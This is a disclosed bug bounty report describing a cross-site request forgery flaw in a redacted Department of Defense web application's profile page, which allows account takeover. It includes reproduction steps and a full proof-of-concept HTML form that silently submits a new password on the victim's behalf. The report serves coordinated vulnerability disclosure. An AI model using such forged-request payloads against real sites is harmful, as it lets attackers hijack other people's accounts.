# Account takeover through CSRF in http://███████/██████████/default.asp

## Report Details
- **Report ID**: 670924
- **URL**: https://hackerone.com/reports/670924
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-08-10T08:35:05.196Z
- **Disclosed**: 2020-06-11T18:21:33.569Z

## Reporter
- **Username**: dhakal_ananda
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
Hi team,

I have found a CSRF vulnerability in http://██████/████/default.asp that leads to account takeover.

## Step-by-step Reproduction Instructions

1. Go to http://██████████/████████/default.asp and login
2. Copy the below HTML code
3. Submit the request and see your profile
4. Try to login again with your username and password
5. Use the password `██████████`. You will be logged in with `████` as a password.


**HTML code:**
```
<html>
  <body>
    <form action="http://██████████/█████████/myprofile.asp?update=yes" method="POST">
      <input type="hidden" name="txtFName" value="███" />
      <input type="hidden" name="txtMI" value="By" />
      <input type="hidden" name="txtLName" value="█████████" />
      <input type="hidden" name="txtTitle" value="" />
      <input type="hidden" name="txtOrganization" value="H1" />
      <input type="hidden" name="txtEmail" value="██████████" />
      <input type="hidden" name="txtPhone" value="" />
      <input type="hidden" name="txtFax" value="" />
      <input type="hidden" name="txtStreet1" value="██████████" />
      <input type="hidden" name="txtStreet2" value="" />
      <input type="hidden" name="txtCity" value="" />
      <input type="hidden" name="state" value="NULL" />
      <input type="hidden" name="txtZip" value="" />
      <input type="hidden" name="txtPassword" value="███" />
      <input type="hidden" name="txtVeriPW" value="█████" />
      <input type="hidden" name="submit1" value="Submit" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

## Impact

Complete account takeover

## Attachments
No attachments
